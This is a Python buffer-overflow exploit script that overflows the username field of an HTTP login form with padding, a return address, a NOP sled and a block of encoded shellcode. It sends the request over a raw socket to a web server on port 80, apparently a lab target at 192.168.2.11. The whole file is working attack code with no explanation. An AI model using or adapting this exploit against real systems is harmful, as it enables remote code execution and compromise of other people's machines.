import socket

import os

import sys

buf = "A" * 780
buf += "\x83\x0c\x09\x10"  
buf += "\x90" * 20 
#shellcode
buf += b"\xdb\xc8\xd9\x74\x24\xf4\xbf\xcb\xc2\x7d\xec\x5b\x33"
buf += b"\xc9\xb1\x52\x83\xc3\x04\x31\x7b\x13\x03\xb0\xd1\x9f"
buf += b"\x19\xba\x3e\xdd\xe2\x42\xbf\x82\x6b\xa7\x8e\x82\x08"
buf += b"\xac\xa1\x32\x5a\xe0\x4d\xb8\x0e\x10\xc5\xcc\x86\x17"
buf += b"\x6e\x7a\xf1\x16\x6f\xd7\xc1\x39\xf3\x2a\x16\x99\xca"
buf += b"\xe4\x6b\xd8\x0b\x18\x81\x88\xc4\x56\x34\x3c\x60\x22"
buf += b"\x85\xb7\x3a\xa2\x8d\x24\x8a\xc5\xbc\xfb\x80\x9f\x1e"
buf += b"\xfa\x45\x94\x16\xe4\x8a\x91\xe1\x9f\x79\x6d\xf0\x49"
buf += b"\xb0\x8e\x5f\xb4\x7c\x7d\xa1\xf1\xbb\x9e\xd4\x0b\xb8"
buf += b"\x23\xef\xc8\xc2\xff\x7a\xca\x65\x8b\xdd\x36\x97\x58"
buf += b"\xbb\xbd\x9b\x15\xcf\x99\xbf\xa8\x1c\x92\xc4\x21\xa3"
buf += b"\x74\x4d\x71\x80\x50\x15\x21\xa9\xc1\xf3\x84\xd6\x11"
buf += b"\x5c\x78\x73\x5a\x71\x6d\x0e\x01\x1e\x42\x23\xb9\xde"
buf += b"\xcc\x34\xca\xec\x53\xef\x44\x5d\x1b\x29\x93\xa2\x36"
buf += b"\x8d\x0b\x5d\xb9\xee\x02\x9a\xed\xbe\x3c\x0b\x8e\x54"
buf += b"\xbc\xb4\x5b\xfa\xec\x1a\x34\xbb\x5c\xdb\xe4\x53\xb6"
buf += b"\xd4\xdb\x44\xb9\x3e\x74\xee\x40\xa9\xbb\x47\x48\x20"
buf += b"\x54\x9a\x4c\x23\xf8\x13\xaa\x29\x10\x72\x65\xc6\x89"
buf += b"\xdf\xfd\x77\x55\xca\x78\xb7\xdd\xf9\x7d\x76\x16\x77"
buf += b"\x6d\xef\xd6\xc2\xcf\xa6\xe9\xf8\x67\x24\x7b\x67\x77"
buf += b"\x23\x60\x30\x20\x64\x56\x49\xa4\x98\xc1\xe3\xda\x60"
buf += b"\x97\xcc\x5e\xbf\x64\xd2\x5f\x32\xd0\xf0\x4f\x8a\xd9"
buf += b"\xbc\x3b\x42\x8c\x6a\x95\x24\x66\xdd\x4f\xff\xd5\xb7"
buf += b"\x07\x86\x15\x08\x51\x87\x73\xfe\xbd\x36\x2a\x47\xc2"
buf += b"\xf7\xba\x4f\xbb\xe5\x5a\xaf\x16\xae\x6b\xfa\x3a\x87"
buf += b"\xe3\xa3\xaf\x95\x69\x54\x1a\xd9\x97\xd7\xae\xa2\x63"
buf += b"\xc7\xdb\xa7\x28\x4f\x30\xda\x21\x3a\x36\x49\x41\x6f"


fuzz="username="+buf+"&password=A"

buffer="POST /login HTTP/1.1\r\n"

buffer+="Host: 192.168.2.11\r\n"

buffer+="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"

buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"

buffer+="Accept-Language: en-US,en;q=0.5\r\n"

buffer+="Referer: http://192.168.2.11/login\r\n"

buffer+="Connection: close\r\n"

buffer+="Content-Type: application/x-www-form-urlencoded\r\n"

buffer+="Content-Length: "+str(len(fuzz))+"\r\n"

buffer+="\r\n"

buffer+=fuzz

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

expl.connect(("ip", 80))

expl.send(buffer)

expl.close()
